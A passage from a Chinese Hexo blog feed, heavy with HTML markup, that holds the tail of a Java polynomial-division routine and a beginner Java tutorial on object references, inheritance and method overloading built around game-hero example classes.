punctuation">)</span><span class="token operator">-</span>count<span class="token operator">*</span>bx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cx0<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>        cx0<span class="token operator">=</span><span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">-</span>count<span class="token operator">*</span>bx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                    cx<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> ax0 <span class="token operator">=</span> count<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>bl<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ax0<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        ax<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> <span class="token punctuation">(</span>ax<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">-</span>ax0<span class="token operator">*</span>bx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token operator">%</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>                     ax<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Invert</span><span class="token punctuation">(</span>bx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">")("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Invert</span><span class="token punctuation">(</span>cx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">") + ("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Invert</span><span class="token punctuation">(</span>ax<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">") "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//vector->多项式输出</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Invert</span><span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> asize <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>asize<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"*x^"</span><span class="token operator">+</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" + "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 信安数学基础C语言代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习</title>
      <link href="2020/11/28/java%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/11/28/java%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><h4 id="引用和指向"><a href="#引用和指向" class="headerlink" title="引用和指向"></a>引用和指向</h4><p><code>new Hero();</code></p><p> 代表<strong>创建</strong>了一个Hero对象<br>但是也仅仅是创建了一个对象，没有办法访问它<br>为了访问这个对象，会使用<strong>引用</strong>来<strong>代表</strong>这个对象</p><p><code>Hero h = new Hero();</code><br>h这个变量是Hero类型，又叫做引用<br>=的意思指的h这个引用<strong>代表</strong>右侧创建的对象<br>“<strong>代表</strong>” 在面向对象里，又叫做“<strong>指向</strong>”</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/1.png" alt="1" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//创建一个对象</span>        <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//使用一个引用来指向这个对象</span>        <span class="token class-name">Hero</span> h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一个对象，多个引用"><a href="#一个对象，多个引用" class="headerlink" title="一个对象，多个引用"></a>一个对象，多个引用</h4><p>引用有多个，但是对象只有一个。<br>在这个例子里，所有引用都指向了同一个对象。<br>对象就像 “一个人”， 引用就像”身份证”<br>身份证证的复印件可以有多张，但是真正的”人” 只有这么一个</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/617.jpg" alt="617" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>         <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>         <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>         <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//使用一个引用来指向这个对象</span>        <span class="token class-name">Hero</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h2 <span class="token operator">=</span> h1<span class="token punctuation">;</span>  <span class="token comment">//h2指向h1所指向的对象</span>        <span class="token class-name">Hero</span> h3 <span class="token operator">=</span> h1<span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h4 <span class="token operator">=</span> h1<span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h5 <span class="token operator">=</span> h4<span class="token punctuation">;</span>                <span class="token comment">//h1,h2,h3,h4,h5 五个引用，都指向同一个对象</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="一个引用，多个对象"><a href="#一个引用，多个对象" class="headerlink" title="一个引用，多个对象"></a>一个引用，多个对象</h4><p>第8行，引用garen指向新创建的对象（对象1）<br>第9行，同一个引用garen指向新创建的对象（对象2）<br>这个时候，对象1，就没有任何引用指向了<br>换句话说，就没有任何手段控制和访问该对象，那么该对象就变得没有意义。</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/619.jpg" alt="619" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">Hero</span> garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       garen <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>如代码，问题:<br>h4所指向的对象和h2所指向的对象，是否是同一个对象？</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>     <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">Hero</span> h1 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h2 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h3<span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h4<span class="token punctuation">;</span>           h3 <span class="token operator">=</span> h1<span class="token punctuation">;</span>           h4 <span class="token operator">=</span> h3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><p>不是同一个对象,h1,h3,h4为同一个对象，h2为另一个对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">float</span> hp<span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">Hero</span> h1 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h2 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h3<span class="token punctuation">;</span>           <span class="token class-name">Hero</span> h4<span class="token punctuation">;</span>           h3 <span class="token operator">=</span> h1<span class="token punctuation">;</span>           h4 <span class="token operator">=</span> h3<span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h4的地址为："</span> <span class="token operator">+</span> h4<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h3的地址为："</span> <span class="token operator">+</span> h3<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h2的地址为："</span> <span class="token operator">+</span> h2<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"h1的地址为："</span> <span class="token operator">+</span> h1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/image-20201129003226218.png" alt="image-20201129003226218" loading="lazy"></p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="不继承"><a href="#不继承" class="headerlink" title="不继承"></a>不继承</h4><p>物品类有名称，价格属性</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> price<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>武器类： Weapon<strong>不继承Item</strong>的写法<br>独立设计 name和price属性<br>同时多了一个属性 damage 攻击力</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Weapon</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> price<span class="token punctuation">;</span>    <span class="token keyword">int</span> damage<span class="token punctuation">;</span> <span class="token comment">//攻击力</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="继承-1"><a href="#继承-1" class="headerlink" title="继承"></a>继承</h4><p>这一次Weapon<strong>继承Item</strong><br>虽然Weapon自己没有设计name和price,但是通过继承Item类，也具备了name和price属性</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Weapon</span> <span class="token keyword">extends</span> <span class="token class-name">Item</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> damage<span class="token punctuation">;</span> <span class="token comment">//攻击力</span>         <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Weapon</span> infinityEdge <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Weapon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        infinityEdge<span class="token punctuation">.</span>damage <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span> <span class="token comment">//damage属性在类Weapon中新设计的</span>                 infinityEdge<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"无尽之刃"</span><span class="token punctuation">;</span><span class="token comment">//name属性，是从Item中继承来的，就不需要重复设计了</span>        infinityEdge<span class="token punctuation">.</span>price <span class="token operator">=</span> <span class="token number">3600</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><p>设计一个类Armor护甲<br>继承Item类，并且额外提供一个属性ac: 护甲等级 int类型</p><p>实例化出两件护甲<br>名称 价格 护甲等级<br>布甲 300 15<br>锁子甲 500 40</p><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> name<span class="token punctuation">;</span>      <span class="token keyword">int</span> prize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Armor</span> <span class="token keyword">extends</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> level<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Armor</span> armor1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Armor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Armor</span> armor2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Armor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        armor1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"布甲"</span><span class="token punctuation">;</span>        armor2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"锁子甲"</span><span class="token punctuation">;</span>        armor1<span class="token punctuation">.</span>prize <span class="token operator">=</span> <span class="token number">300</span><span class="token punctuation">;</span>        armor2<span class="token punctuation">.</span>prize <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>        armor1<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">;</span>        armor2<span class="token punctuation">.</span>level<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>armor1<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"的价格为："</span><span class="token operator">+</span>armor1<span class="token punctuation">.</span>prize<span class="token operator">+</span><span class="token string">",等级为："</span><span class="token operator">+</span>armor1<span class="token punctuation">.</span>level<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>armor2<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"的价格为："</span><span class="token operator">+</span>armor2<span class="token punctuation">.</span>prize<span class="token operator">+</span><span class="token string">",等级为："</span><span class="token operator">+</span>armor2<span class="token punctuation">.</span>level<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><h4 id="attack方法的重载"><a href="#attack方法的重载" class="headerlink" title="attack方法的重载"></a>attack方法的重载</h4><p>方法重载即方法的方法名相同，但参数类型不一样</p><p>比如物理攻击英雄叫做ADHero</p><p>为ADHero 提供三种方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法名是一样的，但是参数类型不一样<br>在调用方法attack的时候，会根据传递的参数类型以及数量，自动调用对应的方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ADHero</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" 进行了一次攻击 ，但是不确定打中谁了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"对"</span> <span class="token operator">+</span> h1<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"进行了一次攻击 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h1<span class="token punctuation">,</span> <span class="token class-name">Hero</span> h2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">"同时对"</span> <span class="token operator">+</span> h1<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"和"</span> <span class="token operator">+</span> h2<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"进行了攻击 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ADHero</span> bh <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ADHero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bh<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"赏金猎人"</span><span class="token punctuation">;</span>         <span class="token class-name">Hero</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h1<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        h2<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"提莫"</span><span class="token punctuation">;</span>         bh<span class="token punctuation">.</span><span 